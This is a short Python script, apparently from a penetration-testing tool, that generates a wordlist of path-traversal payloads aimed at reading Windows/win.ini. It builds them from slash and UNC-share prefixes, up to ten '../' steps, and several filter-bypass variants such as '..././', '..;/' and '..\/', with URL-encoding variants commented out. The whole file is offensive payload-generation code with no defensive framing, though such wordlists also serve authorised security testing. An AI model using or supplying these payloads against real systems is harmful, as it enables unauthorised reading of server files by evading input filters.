prefixes = [
    '',
    '/',
    '//',
    '///',
    '////',
    '////',
    '/////',
    '//////',
    '///////',
    '////////',
    # '{base}',
    # '{base}/',
    # '{base}//',
    # '{base}///',
    # '{base}////',
    # '{base}////',
    # '{base}/////',
    # '{base}//////',
    # '{base}///////',
    # '{base}////////',
    '\\\\localhost\\c$\\',
    # '{base}\\\\localhost\\c$\\',
]

suffixes = [
    'Windows/win.ini',
]

templates = ['../' * n for n in range(0, 11)]

# unicodeEscapes2 = [f'%u00{hex(s)[2:].zfill(2)}' for s in range(256)]
# negativeNumbers = ['-' + '1' * n for n in range(1, 21)]


def generate():
    wordlist = []
    wordlistTmp = []

    # create wordlists
    for prefix in prefixes:
        for suffix in suffixes:
            for template in templates:
                word = prefix + template + suffix

                # simple payload
                wordlistTmp.append(word)

                # UNC path
                wordlistTmp.append(word.replace('/', '\\'))

                # err[error]or bypass
                wordlistTmp.append(word.replace('../', '..././'))
                wordlistTmp.append(word.replace('../', '...\\.\\'))

                # ..;/ bypass
                wordlistTmp.append(word.replace('../', '..;/'))

                # ..\/ bypass
                wordlistTmp.append(word.replace('/', '\/'))

                # ..// bypassess
                wordlistTmp.append(word.replace('../', '..///'))
                wordlistTmp.append(word.replace('../', '..//////'))


    # add different encodings
    for word in wordlistTmp:
        # plain
        wordlist.append(word)
        # URL encoding
        # wordlist.append(word.replace('/', '%2F').replace('\\','%5C').replace(';','%3B'))
        # # double URL encoding
        # wordlist.append(word.replace('/', '%252F').replace('\\','%255C').replace(';','%253B'))

    wordlist = list(set(wordlist))
    return wordlist
